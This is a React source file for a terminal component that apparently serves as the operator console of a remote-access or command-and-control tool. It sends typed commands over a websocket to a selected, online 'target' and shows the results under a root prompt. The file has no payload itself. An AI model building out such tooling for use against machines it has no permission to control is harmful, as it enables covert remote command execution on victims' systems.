import { useUsersStore } from "../store/useSampleStore";
import { TfiInfoAlt } from "react-icons/tfi";
import { OPERATIONS } from "../global";
import { useSocketStore } from "../store/useSocket";
import { useEffect, useRef } from 'react';
import { Terminal } from 'xterm';
import { FitAddon } from 'xterm-addon-fit';
import 'xterm/css/xterm.css';

const Shell = () => {
    const socket = useSocketStore();
    const users = useUsersStore();
    
    const terminalRef = useRef<HTMLDivElement>(null);
    const xtermRef    = useRef<Terminal>(null);
    const fitAddonRef = useRef<FitAddon>(null);

    let element = null;

    const writePrompt = () => {
        xtermRef.current.write(`\r\nroot@${users.selectedUser.usr_name}> `);
    }
    
    useEffect(() => {
        if(!terminalRef.current) return;

        xtermRef.current = new Terminal({
            cursorBlink: true,
            rows: 20,
            cols: 80,
        });

        fitAddonRef.current = new FitAddon();
        xtermRef.current.loadAddon(fitAddonRef.current);

        xtermRef.current.open(terminalRef.current);
        fitAddonRef.current.fit();

        let _data = "";

        xtermRef.current.onData((data) => {
            _data += data;

            if (data.charCodeAt(0) === 13) { // Enter key
                if(!socket.client) socket.connect();
                
                socket.client?.send(OPERATIONS.COMMAND + _data);
                writePrompt();

                _data = "";
            } 
            else if (data.charCodeAt(0) === 127) { // Backspace key
                console.log(data.charAt(1));
                
                xtermRef.current.write('\b \b');
            } 
            else {
                xtermRef.current.write(data);
            }
        });

        xtermRef.current.focus();

        return () => {
            xtermRef.current.dispose();
        };
    }, [users]);

    useEffect(() => {
        if(!socket.client)
            socket.connect();
    }, []);
    
    useEffect(() => {
        if(socket.client && socket.client?.readyState === 1)
            socket.client?.addEventListener('message', ({ data }) => {
                if(data.startsWith(OPERATIONS.COMMAND_RESULT)) {
                    xtermRef.current.write(`\r${data.slice(OPERATIONS.COMMAND_RESULT.length)}\r\n`);
                    writePrompt();
                }
            })
    })    

    switch (users.selectedUser?.isOnline) {
        case true:
            element = (
                <div ref={terminalRef} style={{ height: '100%', width: '100%' }} />
            );
            break;

        case false:
            element = (
                <div className="text-red-300 f-center flex-col gap-2">
                    <TfiInfoAlt size={30} />
                    <span className="">
                        Cannot get shell access to target. Target is Offline
                    </span>
                </div>
            );
            break;
    
        default:
            element = (
                <div className="f-center flex-col opacity-50 gap-2">
                    <TfiInfoAlt size={30} />
                    <span>
                        No User Selected.
                    </span>
                </div>
            );
            break;
    }

    return (
        <div className={`f-center`} id="terminal-container">
            {element}
        </div>
    );
}

export default Shell;